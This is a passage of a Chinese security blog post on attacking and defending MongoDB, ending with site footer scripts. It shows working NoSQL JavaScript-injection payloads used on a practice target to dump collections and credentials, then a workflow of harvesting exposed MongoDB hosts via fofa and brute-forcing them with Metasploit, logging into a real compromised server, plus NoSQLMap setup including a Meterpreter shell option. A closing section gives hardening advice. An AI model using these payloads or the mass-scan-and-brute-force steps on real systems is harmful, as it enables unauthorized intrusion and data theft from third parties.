+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">219.153</span><span class="number">.49</span><span class="number">.228</span>:<span class="number">45718</span><span class="operator">/</span>new_list.php?id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%8812.01.13.png" alt="截屏2021-11-08 上午12.01.13"></p>
+<p>常规情况下通过单引号判断注入，返回不同页面说明存在注入点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/new_list.php?id=1&#x27;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%8812.05.48.png" alt="截屏2021-11-08 上午12.05.48"></p>
+<p>构造 payload 测试回显内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/new_list.php?id=1&#x27;&#125;);return (&#123;title:1,content:&#x27;2</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%8812.27.49.png" alt="截屏2021-11-08 上午12.27.49"></p>
+<p>成功爆出数据库名为<code>mozhe_cms_Authority</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/new_list.php?id=1&#x27;&#125;);return (&#123;title:tojson(db),content:&#x27;1</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%881.59.28.png" alt="截屏2021-11-08 上午1.59.28"></p>
+<p>成功爆出集合名，分别为<code>notice</code>、<code>Authority_confidential</code>、<code>system.indexes</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new_list.php?id=1&#x27;&#125;);return (&#123;title:tojson(db.getCollectionNames()),content:&#x27;1</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%882.01.01.png" alt="截屏2021-11-08 上午2.01.01"></p>
+<p>针对集合<code>Authority_confidential</code>爆出对应文档</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new_list.php?id=1&#x27;&#125;);return (&#123;title:tojson(db.Authority_confidential.find()[0]),content:&#x27;1</span><br><span class="line">new_list.php?id=1&#x27;&#125;);return (&#123;title:tojson(db.Authority_confidential.find()[1]),content:&#x27;1</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%882.10.37.png" alt="截屏2021-11-08 上午2.10.37"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%882.10.48.png" alt="截屏2021-11-08 上午2.10.48"></p>
+<p>成功拿到用户名为<code>mozhe</code>，两个密码经过md5解密后如下：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">0eae21a0d4eb17267a0981af5f8f0397:</span> <span class="number">179303</span></span><br><span class="line"><span class="attr">a83cd5ad5ed3e1c5597441aaab289f5c:</span> <span class="string">dsansda</span></span><br></pre></td></tr></table></figure>
+
+<p>使用<code>mozhe/dsansda</code>可登录应用<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%882.28.59.png" alt="截屏2021-11-08 上午2.28.59"></p>
+<p>成功拿到flag：mozhe0500ad3c303c29201bbe1dbef89<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%882.29.36.png" alt="截屏2021-11-08 上午2.29.36"></p>
+<h3 id="未授权登录"><a href="#未授权登录" class="headerlink" title="未授权登录"></a>未授权登录</h3><p>通过 fofa 可导出 mongodb 数据库的IP地址，搜索语句如下：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;mongodb&quot;</span> <span class="string">&amp;&amp;</span> <span class="string">protocol=&quot;mongodb&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%882.33.56.png" alt="截屏2021-11-08 上午2.33.56"></p>
+<p>使用 fofaAPI 可导出 MongoDB 数据库的IP地址，配置如下</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;rule&#x27;</span><span class="string">:&#x27;&quot;mongodb&quot;</span> <span class="string">&amp;&amp;</span> <span class="string">protocol=&quot;mongodb&quot;&#x27;</span>,<span class="string">&#x27;page&#x27;</span><span class="string">:&#x27;&#x27;</span>,<span class="string">&#x27;size&#x27;</span><span class="string">:&#x27;100&#x27;</span>,<span class="string">&#x27;fields&#x27;</span><span class="string">:&#x27;host&#x27;</span>,<span class="string">&#x27;is_full&#x27;</span><span class="string">:&#x27;&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%882.37.13.png" alt="截屏2021-11-08 上午2.37.13"></p>
+<p>使用 MSF 对 MongDB 数据库进行爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf &gt; use auxiliary/scanner/mongodb/mongodb_login</span><br><span class="line">msf &gt; <span class="built_in">set</span> rhosts <span class="string">&#x27;file:/root/Desktop/ouput.txt&#x27;</span></span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%882.45.07.png" alt="截屏2021-11-08 上午2.45.07"></p>
+<p>随意选择爆破成功的IP，登录数据库课成功查看目标数据库信息<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%882.51.13.png" alt="截屏2021-11-08 上午2.51.13"></p>
+<h3 id="自动化评估"><a href="#自动化评估" class="headerlink" title="自动化评估"></a>自动化评估</h3><p>可以通过自动化方法来查找之前所提到的所有漏洞，存在一个工具NoSQLMap<br><em><strong>工具地址：<a target="_blank" rel="noopener" href="https://github.com/codingo/NoSQLMap">https://github.com/codingo/NoSQLMap</a></strong></em></p>
+<h4 id="NoSQLMap介绍"><a href="#NoSQLMap介绍" class="headerlink" title="NoSQLMap介绍"></a>NoSQLMap介绍</h4><p>NoSQLMap是一个开源的Python工具，主要用于审计和自动化注入攻击（包括版本小于2.2.4 getshell），并利用NoSQL数据库中的缺省配置弱点以及使用NoSQL的web应用程序来泄漏数据库中的数据。目前这个工具主要集中在MongoDB上，但是在未来版本中基于其他NoSQL数据库的平台，比如CouchDB、Redis、Cassandra等提供支持。</p>
+<h4 id="NoSQLMap特性"><a href="#NoSQLMap特性" class="headerlink" title="NoSQLMap特性"></a>NoSQLMap特性</h4><ul>
+<li>自动化对MongoDB、CouchDB数据库枚举和克隆攻击</li>
+<li>通过基于MongoDB的web应用程序来提取数据库信息</li>
+<li>使用默认访问和枚举版本扫描MongDB、CouchDB数据库的网段</li>
+<li>使用强字典爆破MongDB、CouchDB数据库的哈希</li>
+<li>针对MongoCLient的PHP应用程序参数注入返回所有数据库记录</li>
+<li>JavaScript函数变量转移和任意代码注入来返回所有的数据库记录</li>
+<li>基于计时类的攻击类似于SQL盲注来验证没有回显信息的JavaScript注入漏洞</li>
+</ul>
+<h4 id="NoSQLMap安装使用"><a href="#NoSQLMap安装使用" class="headerlink" title="NoSQLMap安装使用"></a>NoSQLMap安装使用</h4><p>主要通过setup.py来安装NoSQLMap</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 setup.py install</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%883.06.14.png" alt="截屏2021-11-08 上午3.06.14"></p>
+<p>也可以使用 docker 来进行安装</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> docker</span><br><span class="line">docker build -t nosqlmap .</span><br></pre></td></tr></table></figure>
+<p>或者在 docker-compose 中使用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose run nosqlmap</span><br></pre></td></tr></table></figure>
+<p>进入 nosqlmap</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nosqlmap</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%883.07.17.png" alt="截屏2021-11-08 上午3.07.17"></p>
+<p>首先需要选择1进行选项配置<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%883.08.14.png" alt="截屏2021-11-08 上午3.08.14"></p>
+<p>通过翻译可以了解这些配置</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">.设置目标</span> <span class="string">host/host/IP</span> <span class="string">目标</span> <span class="string">Web</span> <span class="string">服务器</span> <span class="string">如：(www.google.com)</span> <span class="string">或者任何你想要攻击的</span> <span class="string">MongoDB</span> <span class="string">服务器。</span></span><br><span class="line"><span class="number">2</span><span class="string">.设置</span> <span class="string">Web</span> <span class="string">应用</span> <span class="string">port-TCP</span> <span class="string">如果一个</span> <span class="string">Web</span> <span class="string">应用成为目标，为</span> <span class="string">Web</span> <span class="string">应用设置</span> <span class="string">TCP</span> <span class="string">端口。</span></span><br><span class="line"><span class="number">3</span><span class="string">.设置</span> <span class="string">URI</span> <span class="string">路径，部分</span> <span class="string">URI</span> <span class="string">包含页面名称及任何非主机名称的参数</span> <span class="string">如：(/app/acct.php?acctid=102)。</span></span><br><span class="line"><span class="number">4</span><span class="string">.设置</span> <span class="string">HTTP</span> <span class="string">请求方法</span> <span class="string">(GET/POST)</span> <span class="string">设置请求方法为</span> <span class="string">GET</span> <span class="string">或</span> <span class="string">POST</span> <span class="string">；现在只能使用</span> <span class="string">GET</span> <span class="string">方法但是后续会增加</span> <span class="string">POST</span> <span class="string">方法。</span></span><br><span class="line"><span class="number">5</span><span class="string">.设置我的本地</span> <span class="string">Mongo/Shell</span> <span class="string">IP-Set</span> <span class="string">如果直接攻击一个</span> <span class="string">MongoDB</span> <span class="string">实例，设置这个选项到目标</span> <span class="string">Mongo</span> <span class="string">安装的IP来复制受害者服务器或打开</span> <span class="string">Meterpreter</span> <span class="string">Shell。</span></span><br><span class="line"><span class="number">6</span><span class="string">.设置</span> <span class="string">Shell</span> <span class="string">监听端口，如果开放</span> <span class="string">Meterpreter</span> <span class="string">Shell</span> <span class="string">就会指定端口。</span></span><br><span class="line"><span class="number">7</span><span class="string">.加载选项</span> <span class="string">file-Load</span> <span class="string">加载之前保存的</span> <span class="number">1</span><span class="number">-6</span> <span class="string">中的设置。</span></span><br><span class="line"><span class="number">8</span><span class="string">.加载选项</span> <span class="string">从</span> <span class="string">Burp</span> <span class="string">保存的</span> <span class="string">(request-Parse)</span> <span class="string">请求中加载</span> <span class="string">Burp</span> <span class="string">Suite</span> <span class="string">的请求，并填充</span> <span class="string">Web</span> <span class="string">应用选项。、</span></span><br><span class="line"><span class="number">9</span><span class="string">.保存选项设置</span> <span class="string">file-Save</span> <span class="string">保存</span> <span class="number">1</span><span class="number">-6</span> <span class="string">中的设置以便未来使用。</span></span><br><span class="line"><span class="string">x.返回主菜单</span> <span class="string">meun-Use</span> <span class="string">使用这个选项开始攻击。</span></span><br></pre></td></tr></table></figure>
+
+<p>将配置设置完成后尝试利用<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%883.10.17.png" alt="截屏2021-11-08 上午3.10.17"></p>
+<h2 id="0x05-MongoDB安全防护"><a href="#0x05-MongoDB安全防护" class="headerlink" title="0x05 MongoDB安全防护"></a>0x05 MongoDB安全防护</h2><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p>对外开放的MongoDB服务如果存在未授权访问，那么攻击者可以随意多数据库进行增删改查操作，存在严重的数据泄漏风险。</p>
+<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>MongoDB服务安装后，默认不会开启权限验证，如果监听设置为0.0.0.0，那么即可远程登录数据库，以下为主要的版本区别：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3.0</span><span class="string">之前版本的MongoDB，默认监听0.0.0.0。但之后的版本默认监听127.0.0.1。</span></span><br><span class="line"><span class="number">3.0</span><span class="string">之前版本的MongoDB如果未添加管理员账号和数据库账号，当--auth启动时，在本地可直接登录数据库，但是远程登录则需要认证信息</span></span><br><span class="line"><span class="number">3.0</span><span class="string">之后的版本，使用--auth参数，无账号则本地和远程均无法访问数据库</span></span><br></pre></td></tr></table></figure>
+<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>当存在未授权访问漏洞时，使用mongodb数据库连接工具进行连接，通过命令登录数据库即可查看数据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mongo</span><br><span class="line">&gt; show db</span><br><span class="line">&gt; use admin</span><br><span class="line">&gt; show users</span><br></pre></td></tr></table></figure>
+
+<p>除了navicat还可以通过robo进行连接<br><em><strong>下载地址如下：<a target="_blank" rel="noopener" href="https://robomongo.org/download">https://robomongo.org/download</a></strong></em></p>
+<p>建议使用1.2低版本，否则对低版本的存在漏洞数据库无法认证</p>
+<h3 id="整改建议"><a href="#整改建议" class="headerlink" title="整改建议"></a>整改建议</h3><ul>
+<li><p>1、在MongDB本地配置文件中限制IP登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bindIp:127.0.0.1</span><br></pre></td></tr></table></figure></li>
+<li><p>2、在防火墙上设置访问源，以下为linux下的参考方法</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -s &lt;ip-address&gt; -p tcp --destination-port 27017 -m state --state NEW,ESTABLISHED -j ACCEPT //进站规则</span><br><span class="line">iptables -A OUTPUT -d &lt;ip-address&gt; -p tcp --source-port 27017 -m state --state ESTABLISHED -j ACCEPT //出站规则</span><br></pre></td></tr></table></figure>
+<p>如果服务器为windows，那么可以设置服务和命令开启防火墙配置</p>
+</li>
+<li><p>3、基于角色的登录认证功能</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; use admin</span><br><span class="line">&gt; db.createUser(</span><br><span class="line">    &#123;</span><br><span class="line">      user: <span class="string">&quot;myUserAdmin&quot;</span>,</span><br><span class="line">      <span class="built_in">pwd</span>: <span class="string">&quot;Passw0rd&quot;</span>,</span><br><span class="line">      roles: [ &#123; role: <span class="string">&quot;userAdminAnyDatabase&quot;</span>, db: <span class="string">&quot;admin&quot;</span> &#125; ]</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<p>在3.0之前的版本需要通过addUser来创建方法，在cfg文件进行开启认证</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">security:</span></span><br><span class="line">    <span class="attr">authorization:</span> <span class="string">enabled</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>启动MongDB</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongod --config /etc/mongod.conf</span><br></pre></td></tr></table></figure>
+
+<p>通过密码连接本地数据库</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongo --port 27017 -u <span class="string">&quot;myUserAdmin&quot;</span> -p <span class="string">&quot;Passw0rd&quot;</span> --authenticationDatabase <span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>当然在MongDB中也可以通过auth()函数来认证身份信息</p>
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>License</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>READ NEXT</span></section><section class="body fs14"><a id="next" href="/post/dd582856/">数据库攻防之Redis渗透基础<span class="note">Older</span></a><div class="line"></div></section></div>
+
+
+
+
+
+
+  <div class='related-wrap md reveal' id="comments">
+    <div class='cmt-title cap theme'>
+      Join the discussion
+    </div>
+    <div class='cmt-body valine'>
+      
+
+<div id="valine_container" class="valine_thread"><svg class="loading" style="vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </div>
+  </div>
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</p>
+<p>This site was deployed by <a href="https://toxic80l.github.io/">@toxic80L</a> using <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1" title="v1.6.1">Stellar</a>.</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
